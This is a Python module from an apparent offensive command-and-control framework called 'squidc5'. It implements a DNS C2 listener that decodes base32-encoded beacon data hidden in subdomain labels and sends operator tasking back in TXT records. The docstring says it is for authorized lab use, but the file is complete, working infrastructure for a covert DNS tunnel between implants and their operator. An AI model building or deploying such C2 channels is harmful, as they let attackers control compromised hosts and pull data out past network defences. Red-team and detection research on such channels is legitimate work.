"""UDP DNS C2 listener — TXT/A check-ins for authorized lab use."""

from __future__ import annotations

import asyncio
import base64
import json
import logging
import struct
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from squidc5.listeners.manager import ListenerManager

log = logging.getLogger("squidc5.listeners.dns")


def _b32pad(s: str) -> str:
    s = s.replace("-", "").replace("_", "").upper()
    pad = (-len(s)) % 8
    return s + ("=" * pad)


def decode_label_payload(labels: list[str], zone_labels: list[str]) -> dict[str, Any] | None:
    """Extract beacon JSON from labels before zone: b.<b32chunks...>.zone."""
    if len(labels) <= len(zone_labels):
        return None
    # strip zone suffix
    body = labels[: len(labels) - len(zone_labels)]
    if not body:
        return None
    # first label is mode: b=beacon, r=result
    mode = body[0].lower() if body else ""
    chunks = body[1:] if mode in ("b", "r", "c") else body
    raw = "".join(chunks)
    if not raw:
        return {"_mode": mode or "b"}
    try:
        data = base64.b32decode(_b32pad(raw))
        obj = json.loads(data.decode("utf-8"))
        if isinstance(obj, dict):
            obj["_mode"] = mode if mode in ("b", "r", "c") else "b"
            return obj
    except Exception:
        return {"_mode": mode or "b", "hostname": raw[:64]}
    return None


def encode_txt_response(obj: dict[str, Any]) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    return base64.b32encode(raw).decode("ascii").rstrip("=").lower()


def parse_dns_query(data: bytes) -> tuple[int, list[str], int] | None:
    """Return (txid, labels, qtype) or None."""
    if len(data) < 12:
        return None
    txid = struct.unpack("!H", data[0:2])[0]
    # skip flags, counts
    qdcount = struct.unpack("!H", data[4:6])[0]
    if qdcount < 1:
        return None
    pos = 12
    labels: list[str] = []
    try:
        while pos < len(data):
            ln = data[pos]
            pos += 1
            if ln == 0:
                break
            if ln & 0xC0:
                return None  # compression in QNAME unexpected
            labels.append(data[pos : pos + ln].decode("ascii", errors="ignore"))
            pos += ln
        if pos + 4 > len(data):
            return None
        qtype, _qclass = struct.unpack("!HH", data[pos : pos + 4])
        return txid, labels, qtype
    except Exception:
        return None


def build_dns_response(txid: int, query: bytes, txt: str | None, *, nxdomain: bool = False) -> bytes:
    """Build a simple DNS response echoing question; TXT answer or NXDOMAIN."""
    # copy question from query
    if len(query) < 12:
        return b""
    # find end of question
    pos = 12
    while pos < len(query):
        ln = query[pos]
        pos += 1
        if ln == 0:
            break
        if ln & 0xC0:
            pos += 1
            break
        pos += ln
    pos += 4  # qtype+qclass
    question = query[12:pos]
    flags = 0x8183 if nxdomain else 0x8180  # response, recursion available
    ancount = 0 if nxdomain or not txt else 1
    header = struct.pack("!HHHHHH", txid, flags, 1, ancount, 0, 0)
    if nxdomain or not txt:
        return header + question
    # TXT answer: name pointer to question (0xC00C), type TXT, class IN, TTL, rdlength, txt
    name_ptr = b"\xc0\x0c"
    txt_bytes = txt.encode("ascii", errors="ignore")[:200]
    rdata = bytes([len(txt_bytes)]) + txt_bytes
    answer = name_ptr + struct.pack("!HHIH", 16, 1, 60, len(rdata)) + rdata
    return header + question + answer


class DnsProtocol(asyncio.DatagramProtocol):
    def __init__(self, manager: ListenerManager, listener_id: str, zone: str) -> None:
        self.manager = manager
        self.listener_id = listener_id
        self.zone = zone.lower().strip(".")
        self.zone_labels = [p for p in self.zone.split(".") if p]
        self.transport: asyncio.DatagramTransport | None = None

    def connection_made(self, transport: asyncio.BaseTransport) -> None:
        self.transport = transport  # type: ignore[assignment]

    def datagram_received(self, data: bytes, addr: tuple[str | Any, int]) -> None:
        asyncio.create_task(self._handle(data, addr))

    def _send(self, data: bytes, addr: tuple[str | Any, int]) -> None:
        try:
            if self.transport is not None:
                self.transport.sendto(data, addr)
        except Exception:
            pass

    async def _handle(self, data: bytes, addr: tuple[str | Any, int]) -> None:
        if not self.transport:
            return
        parsed = parse_dns_query(data)
        if not parsed:
            return
        txid, labels, qtype = parsed
        labels_l = [x.lower() for x in labels]
        # must end with zone
        if len(labels_l) < len(self.zone_labels) or labels_l[-len(self.zone_labels) :] != self.zone_labels:
            self._send(build_dns_response(txid, data, None, nxdomain=True), addr)
            return
        payload = decode_label_payload(labels_l, self.zone_labels) or {}
        mode = payload.pop("_mode", "b")
        remote = addr[0] if addr else None
        try:
            if mode == "r":
                result = await self.manager.handle_beacon_result(payload)
            else:
                result = await self.manager.handle_beacon(
                    listener_id=self.listener_id,
                    remote_addr=str(remote) if remote else None,
                    payload=payload,
                    user_agent="dns-c2",
                )
            txt = encode_txt_response(result)
            if qtype == 16:  # TXT
                resp = build_dns_response(txid, data, txt)
            else:
                resp = build_dns_response(txid, data, "ok")
            self._send(resp, addr)
            try:
                await self.manager.metrics.incr("dns.queries")
            except Exception:
                pass
        except Exception:
            log.exception("DNS C2 handler error from %s", addr)
            self._send(build_dns_response(txid, data, None, nxdomain=True), addr)


async def start_dns_server(
    manager: ListenerManager,
    listener_id: str,
    host: str,
    port: int,
    zone: str,
) -> tuple[asyncio.DatagramTransport, asyncio.BaseProtocol]:
    loop = asyncio.get_running_loop()
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: DnsProtocol(manager, listener_id, zone),
        local_addr=(host, port),
    )
    return transport, protocol
